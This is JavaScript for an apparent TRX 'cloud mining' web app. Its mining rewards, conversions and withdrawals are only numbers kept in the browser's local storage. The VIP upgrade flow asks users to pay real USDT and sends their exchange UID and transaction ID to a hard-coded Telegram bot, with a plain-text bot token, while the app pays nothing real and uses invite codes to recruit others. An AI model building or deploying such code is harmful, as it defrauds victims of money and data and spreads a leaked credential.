class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        this.telegramConfig = {
            botToken: '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI',
            chatId: '7417215529'
        };
        this.miningInterval = null;
        this.initializeApp();
    }

    initializeApp() {
        this.setupEventListeners();
        this.setupNavigation();
        this.updateDisplay();
        this.startMining();
        this.updateCurrentTime();
    }

    loadUserData() {
        const saved = localStorage.getItem('trxMiningData');
        if (saved) {
            return JSON.parse(saved);
        }
        
        return {
            userId: this.generateUserId(),
            trxBalance: 0,
            usdtBalance: 0,
            vipLevel: 0,
            miningStartTime: Date.now(),
            lastClaim: null,
            miningHistory: [],
            transactions: [],
            inviteCode: this.generateInviteCode(),
            teamSize: 0,
            referralEarnings: 0
        };
    }

    generateUserId() {
        let userId = localStorage.getItem('trxUserId');
        if (!userId) {
            userId = 'USER_' + Math.floor(100000 + Math.random() * 900000);
            localStorage.setItem('trxUserId', userId);
        }
        return userId;
    }

    generateInviteCode() {
        let code = localStorage.getItem('trxInviteCode');
        if (!code) {
            code = 'INV' + Math.floor(1000 + Math.random() * 9000);
            localStorage.setItem('trxInviteCode', code);
        }
        return code;
    }

    saveUserData() {
        localStorage.setItem('trxMiningData', JSON.stringify(this.userData));
        this.updateDisplay();
    }

    setupNavigation() {
        const navButtons = document.querySelectorAll('.nav-btn');
        const sections = document.querySelectorAll('.content-section');

        navButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetSection = btn.getAttribute('data-section');
                
                navButtons.forEach(b => b.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(targetSection).classList.add('active');
            });
        });
    }

    setupEventListeners() {
        document.getElementById('claimMining').addEventListener('click', () => this.claimMiningReward());
        document.getElementById('convertTRX').addEventListener('click', () => this.convertTRX());
        document.getElementById('submitWithdraw').addEventListener('click', () => this.submitWithdrawal());
        
        document.querySelectorAll('.vip-buy-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const vipLevel = e.target.getAttribute('data-vip');
                this.prepareVipPurchase(parseInt(vipLevel));
            });
        });
        
        document.getElementById('submitPayment').addEventListener('click', () => this.submitVipPayment());
    }

    startMining() {
        this.miningInterval = setInterval(() => {
            this.updateMiningTimer();
        }, 1000);
        
        this.addMiningHistory('Mining started');
    }

    updateMiningTimer() {
        const miningStart = this.userData.miningStartTime;
        const now = Date.now();
        const elapsed = now - miningStart;
        const cycleTime = 2 * 60 * 60 * 1000;
        
        const remaining = cycleTime - (elapsed % cycleTime);
        
        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
        
        const timerString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        document.getElementById('miningTimer').textContent = timerString;
        
        if (remaining <= 1000 && elapsed >= cycleTime) {
            this.autoClaimMiningReward();
        }
    }

    async claimMiningReward() {
        const miningStart = this.userData.miningStartTime;
        const now = Date.now();
        const elapsed = now - miningStart;
        const cycleTime = 2 * 60 * 60 * 1000;
        
        if (elapsed < cycleTime) {
            this.showNotification('Mining cycle not completed yet!', 'error');
            return;
        }
        
        const reward = 5;
        this.userData.trxBalance += reward;
        this.userData.miningStartTime = now;
        this.userData.lastClaim = now;
        
        this.addMiningHistory(`Collected +${reward} TRX`);
        this.addTransaction('Mining Reward', reward, 'TRX');
        this.saveUserData();
        
        this.showNotification(`🎉 Successfully claimed ${reward} TRX!`, 'success');
        
        // Telegram message
        const telegramMessage = `🔄 Mining Reward Claimed\n👤 User ID: ${this.userData.userId}\n💰 Amount: ${reward} TRX\n⏰ Time: ${new Date().toLocaleString()}`;
        await this.sendToTelegram(telegramMessage);
    }

    autoClaimMiningReward() {
        const reward = 5;
        this.userData.trxBalance += reward;
        this.userData.miningStartTime = Date.now();
        
        this.addMiningHistory(`Auto-collected +${reward} TRX`);
        this.addTransaction('Auto Mining Reward', reward, 'TRX');
        this.saveUserData();
        
        this.showNotification(`🤖 Auto-claimed ${reward} TRX!`, 'info');
    }

    async convertTRX() {
        const trxAmount = parseFloat(document.getElementById('trxToConvert').value);
        
        if (!trxAmount || trxAmount <= 0) {
            this.showNotification('Please enter valid TRX amount!', 'error');
            return;
        }
        
        if (trxAmount > this.userData.trxBalance) {
            this.showNotification('Insufficient TRX balance!', 'error');
            return;
        }
        
        const conversionRate = 0.10;
        const usdtAmount = trxAmount * conversionRate;
        
        this.userData.trxBalance -= trxAmount;
        this.userData.usdtBalance += usdtAmount;
        
        this.addTransaction('TRX to USDT Conversion', usdtAmount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`✅ Converted ${trxAmount} TRX to ${usdtAmount.toFixed(6)} USDT`, 'success');
        document.getElementById('trxToConvert').value = '';
        
        // Telegram message
        const telegramMessage = `💱 TRX Conversion\n👤 User ID: ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(6)} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
        await this.sendToTelegram(telegramMessage);
    }

    async submitWithdrawal() {
        const receiverUid = document.getElementById('receiverUid').value.trim();
        const amount = parseFloat(document.getElementById('withdrawAmount').value);
        
        if (!receiverUid) {
            this.showNotification('Please enter receiver UID!', 'error');
            return;
        }
        
        if (!amount || amount <= 0) {
            this.showNotification('Please enter valid amount!', 'error');
            return;
        }
        
        if (amount > this.userData.usdtBalance) {
            this.showNotification('Insufficient USDT balance!', 'error');
            return;
        }
        
        this.userData.usdtBalance -= amount;
        this.addTransaction('Withdrawal', -amount, 'USDT');
        this.saveUserData();
        
        this.showNotification(`📤 Withdrawal request submitted!`, 'success');
        
        document.getElementById('receiverUid').value = '';
        document.getElementById('withdrawAmount').value = '';
        
        // Telegram message
        const telegramMessage = `💸 Withdrawal Request\n👤 User ID: ${this.userData.userId}\n📤 To UID: ${receiverUid}\n💰 Amount: ${amount} USDT\n⏰ Time: ${new Date().toLocaleString()}`;
        await this.sendToTelegram(telegramMessage);
    }

    prepareVipPurchase(vipLevel) {
        this.currentVipLevel = vipLevel;
        const amount = vipLevel === 1 ? 1.00 : 10.00;
        
        this.showNotification(`Prepare ${amount} USDT for VIP ${vipLevel} purchase`, 'info');
        
        document.getElementById('vip').classList.add('active');
        document.querySelector('.payment-info').scrollIntoView({ behavior: 'smooth' });
    }

    async submitVipPayment() {
        const senderUid = document.getElementById('senderUid').value.trim();
        const transactionId = document.getElementById('transactionId').value.trim();
        
        if (!senderUid) {
            this.showNotification('Please enter your exchange UID!', 'error');
            return;
        }
        
        const vipLevel = this.currentVipLevel;
        const amount = vipLevel === 1 ? 1.00 : 10.00;
        
        // Telegram message
        const telegramMessage = `🆕 VIP Purchase Request\n👤 User ID: ${this.userData.userId}\n⭐ VIP Level: ${vipLevel}\n💰 Amount: ${amount} USDT\n🔗 Sender UID: ${senderUid}\n📄 Transaction ID: ${transactionId || 'Not provided'}\n⏰ Time: ${new Date().toLocaleString()}`;
        
        await this.sendToTelegram(telegramMessage);
        
        this.showNotification('✅ VIP purchase request sent to admin!', 'success');
        
        document.getElementById('senderUid').value = '';
        document.getElementById('transactionId').value = '';
    }

    async sendToTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${this.telegramConfig.botToken}/sendMessage`;
            const formData = new FormData();
            formData.append('chat_id', this.telegramConfig.chatId);
            formData.append('text', message);
            formData.append('parse_mode', 'HTML');

            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });

            const data = await response.json();
            
            if (data.ok) {
                console.log('✅ Message sent to Telegram successfully!');
                return true;
            } else {
                console.error('❌ Telegram API error:', data);
                this.showNotification('❌ Failed to send message to Telegram', 'error');
                return false;
            }
        } catch (error) {
            console.error('❌ Error sending to Telegram:', error);
            this.showNotification('❌ Network error - please check connection', 'error');
            return false;
        }
    }

    addMiningHistory(message) {
        this.userData.miningHistory.unshift({
            message: message,
            timestamp: new Date().toLocaleString()
        });
        
        if (this.userData.miningHistory.length > 10) {
            this.userData.miningHistory = this.userData.miningHistory.slice(0, 10);
        }
        
        this.updateMiningHistory();
    }

    addTransaction(description, amount, currency) {
        this.userData.transactions.unshift({
            description: description,
            amount: amount,
            currency: currency,
            timestamp: new Date().toLocaleString(),
            type: amount >= 0 ? 'credit' : 'debit'
        });
        
        if (this.userData.transactions.length > 10) {
            this.userData.transactions = this.userData.transactions.slice(0, 10);
        }
        
        this.updateTransactionHistory();
    }

    updateDisplay() {
        document.getElementById('trxBalance').textContent = this.userData.trxBalance.toFixed(6);
        document.getElementById('usdtBalance').textContent = this.userData.usdtBalance.toFixed(6);
        document.getElementById('totalBalance').textContent = this.userData.usdtBalance.toFixed(6) + ' USDT';
        
        document.getElementById('accountId').textContent = this.userData.userId;
        document.getElementById('inviteCode').textContent = this.userData.inviteCode;
        document.getElementById('vipStatus').textContent = this.userData.vipLevel === 0 ? 'No VIP' : `VIP ${this.userData.vipLevel}`;
        
        document.getElementById('teamSize').textContent = this.userData.teamSize;
        document.getElementById('referralEarnings').textContent = this.userData.referralEarnings.toFixed(6) + ' USDT';
        document.getElementById('activeReferrals').textContent = this.userData.teamSize;
        
        this.updateMiningHistory();
        this.updateTransactionHistory();
    }

    updateMiningHistory() {
        const historyContainer = document.getElementById('miningHistory');
        const currentTime = new Date().toLocaleString();
        
        document.getElementById('currentTime').textContent = currentTime;
        
        if (this.userData.miningHistory.length === 0) {
            return;
        }
        
        historyContainer.innerHTML = this.userData.miningHistory.map(item => `
            <div class="history-item">
                <span>${item.message}</span>
                <span class="time">${item.timestamp}</span>
            </div>
        `).join('') + historyContainer.innerHTML;
    }

    updateTransactionHistory() {
        const historyContainer = document.getElementById('transactionHistory');
        
        if (this.userData.transactions.length === 0) {
            historyContainer.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-receipt"></i>
                    <p>No transactions yet</p>
                </div>
            `;
            return;
        }
        
        historyContainer.innerHTML = this.userData.transactions.map(transaction => `
            <div class="history-item">
                <span>${transaction.description}</span>
                <span class="time ${transaction.type}">
                    ${transaction.type === 'credit' ? '+' : ''}${transaction.amount} ${transaction.currency}
                </span>
            </div>
        `).join('');
    }

    updateCurrentTime() {
        setInterval(() => {
            const now = new Date().toLocaleString();
            const currentTimeElement = document.getElementById('currentTime');
            if (currentTimeElement) {
                currentTimeElement.textContent = now;
            }
        }, 1000);
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        const messageElement = document.getElementById('notificationMessage');
        
        messageElement.textContent = message;
        notification.className = 'notification';
        
        switch(type) {
            case 'success':
                notification.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)';
                break;
            case 'error':
                notification.style.background = 'linear-gradient(135deg, #ff6b6b, #ff4757)';
                break;
            case 'warning':
                notification.style.background = 'linear-gradient(135deg, #ffd700, #ffa500)';
                break;
            default:
                notification.style.background = 'linear-gradient(135deg, #00d4ff, #0099cc)';
        }
        
        notification.classList.remove('hidden');
        
        setTimeout(() => {
            notification.classList.add('hidden');
        }, 3000);
    }
}

// Global functions
function copyInviteCode() {
    const inviteCode = document.getElementById('inviteCode').textContent;
    navigator.clipboard.writeText(inviteCode).then(() => {
        if (window.miningSystem) {
            window.miningSystem.showNotification('Invite code copied to clipboard!', 'success');
        }
    });
}

// Test Telegram connection
async function testTelegramConnection() {
    const miningSystem = window.miningSystem;
    if (miningSystem) {
        const testMessage = `🤖 Bot Connection Test\n✅ System is working perfectly\n👤 User ID: ${miningSystem.userData.userId}\n⏰ Time: ${new Date().toLocaleString()}`;
        const success = await miningSystem.sendToTelegram(testMessage);
        if (success) {
            miningSystem.showNotification('✅ Telegram connection test successful!', 'success');
        }
    }
}

// Initialize the app
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();
    
    // Add test button for debugging
    const testBtn = document.createElement('button');
    testBtn.textContent = 'Test Telegram';
    testBtn.style.position = 'fixed';
    testBtn.style.bottom = '10px';
    testBtn.style.right = '10px';
    testBtn.style.zIndex = '1000';
    testBtn.style.padding = '10px';
    testBtn.style.background = '#ff6b6b';
    testBtn.style.color = 'white';
    testBtn.style.border = 'none';
    testBtn.style.borderRadius = '5px';
    testBtn.style.cursor = 'pointer';
    testBtn.onclick = testTelegramConnection;
    document.body.appendChild(testBtn);
});
